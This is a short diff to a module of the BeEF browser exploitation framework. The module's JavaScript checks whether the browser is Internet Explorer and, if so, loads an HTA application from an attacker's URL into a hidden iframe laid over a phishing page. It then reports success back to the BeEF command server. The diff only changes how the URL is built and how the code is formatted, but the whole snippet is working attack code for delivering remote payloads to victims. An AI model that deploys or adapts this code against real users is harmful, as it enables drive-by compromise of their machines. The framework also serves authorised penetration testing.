@@ -4,14 +4,14 @@
 // See the file 'doc/COPYING' for copying permission
 //
 
-beef.execute(function() {
+beef.execute(function () {
 
-    var hta_url = '<%= @domain %>' + '<%= @hta_mount_point %>';
+    var hta_url = '<%= @ps_url %>' + '/hta';
 
-    if(beef.browser.isIE()){
+    if (beef.browser.isIE()) {
         // application='yes' is IE-only and needed to load the HTA into an IFrame.
         // in this way you can have your phishing page, and load the HTA on top of it
-        beef.dom.createIframe('hidden', {'src':hta_url,'application':'yes'});
+        beef.dom.createIframe('hidden', {'src': hta_url, 'application': 'yes'});
         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'HTA loaded into hidden IFrame.');
     }
 });
